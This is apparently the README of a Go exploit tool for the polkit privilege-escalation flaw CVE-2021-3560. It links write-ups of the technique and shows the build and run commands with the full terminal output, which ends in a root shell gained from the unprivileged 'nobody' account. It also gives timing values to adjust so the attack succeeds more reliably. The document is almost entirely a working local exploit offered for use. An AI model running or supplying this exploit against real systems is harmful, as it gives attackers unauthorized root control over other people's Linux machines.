PolicyKit CVE-2021-3560 Exploitation (Authentication Agent)
====

Blog posts about this exploitation: 
- https://ricterz.me/posts/2022-04-28-a-new-exploitation-way-for-cve-2021-3560-polkit-linux-privilege-escalation.txt
- http://noahblog.360.cn/a-new-exploitation-way-for-cve-2021-3560-policykit-linux-privilege-escalation

### Usage
```
nobody@test:/tmp/CVE-2021-3560$ go build
nobody@test:/tmp/CVE-2021-3560$ ./CVE-2021-3560 pwnkit.service; pwned -p;
[*] Registering PolicyKit authentication agent ...
[*] Authentication agent main loop running ...
[*] Registering PolicyKit authentication agent ...
[*] Registering PolicyKit authentication agent ...
[*] Authentication agent main loop running ...
[*] Authentication agent main loop running ...
[*] Starting systemd service 'pwnkit.service' ...
[+] Received authentication request
- Cookie: 9-87817588aedc5736bf09ae86a89283dc-1-3a975e40d893fcecab679188c115b0f9
- Action ID: org.freedesktop.systemd1.manage-units
[*] Enabling systemd unit file '/tmp/pwnkit.service' ...
[*] Reloading systemd daemon ...
[+] Received authentication request
- Cookie: 10-1768590733d06541bd2ba6147fb10040-1-74abd2debb846e888d7027cd6daeee33
- Action ID: org.freedesktop.systemd1.manage-unit-files
[+] Received authentication request
- Cookie: 11-d25eaa4896dff78bb83e650eea7169a8-1-c5d0e26d0395af523fcf8c27bb72e928
- Action ID: org.freedesktop.systemd1.reload-daemon
Killed
pwned-5.0# id
uid=65534(nobody) gid=65534(nogroup) euid=0(root) egid=0(root) groups=0(root),65534(nogroup)
pwned-5.0#
```

### Notice
For difference environments, change follow values may improve the successful rate:

- [agent.py#47](agent.go#L47): `time.Sleep(time.Millisecond * 10)`
- [agent.py#58](agent.go#L58): `time.Sleep(time.Millisecond * 1)`
